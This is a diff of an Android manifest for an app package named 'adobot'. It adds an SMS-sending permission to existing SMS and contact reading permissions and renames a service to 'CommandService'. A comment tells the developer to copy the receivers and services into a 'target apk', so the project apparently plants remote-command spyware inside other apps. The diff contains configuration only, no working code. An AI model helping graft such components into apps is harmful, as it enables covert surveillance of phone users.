@@ -18,6 +18,8 @@
         android:name="android.permission.READ_SMS"
         android:required="true" />
     <uses-permission
+        android:name="android.permission.SEND_SMS" />
+    <uses-permission
         android:name="android.permission.READ_CONTACTS"
         android:required="true" />
     <uses-permission
@@ -42,7 +44,7 @@
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name="com.android.adobot.MainActivity">
+        <activity android:name="com.android.adobot.activities.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -50,7 +52,7 @@
         </activity>
 
         <!--copy the receivers and services to the target apk source-->
-        <activity android:name="com.android.adobot.UpdateActivity"></activity>
+        <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
 
         <receiver android:name="com.android.adobot.NetworkWatcher">
             <intent-filter>
@@ -58,7 +60,7 @@
             </intent-filter>
         </receiver>
 
-        <service android:name="com.android.adobot.Client" />
+        <service android:name="com.android.adobot.CommandService" />
 
         <!--end of services and receivers-->
 
